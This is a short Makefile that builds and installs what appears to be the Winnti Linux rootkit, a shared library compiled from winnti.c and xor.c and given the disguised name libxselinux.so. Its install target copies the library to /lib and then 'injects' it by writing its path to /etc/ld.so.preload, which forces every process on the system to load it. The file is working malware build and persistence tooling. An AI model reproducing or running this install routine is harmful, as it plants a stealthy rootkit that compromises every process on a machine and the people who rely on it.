INSTALL=/lib

CFLAGS+= -Wall
LDFLAGS+= -lc -ldl -lpthread -lrt -lutil

all: config libxselinux.so

config:
	@python config.py > const.h

libxselinux.so: winnti.c xor.c
	$(CC) -fPIC -g -c winnti.c xor.c
	$(CC) -fPIC -shared -Wl,-soname,libxselinux.so winnti.o xor.o $(LDFLAGS) -o libxselinux.so
	strip libxselinux.so

install: all
	@echo [-] Initiating Installation Directory $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@echo [-] Installing winnti 
	@install -m 0755 libxselinux.so $(INSTALL)/
	@echo [-] Injecting winnti
	@echo $(INSTALL)/libxselinux.so > /etc/ld.so.preload

clean:
	rm libxselinux.so *.o

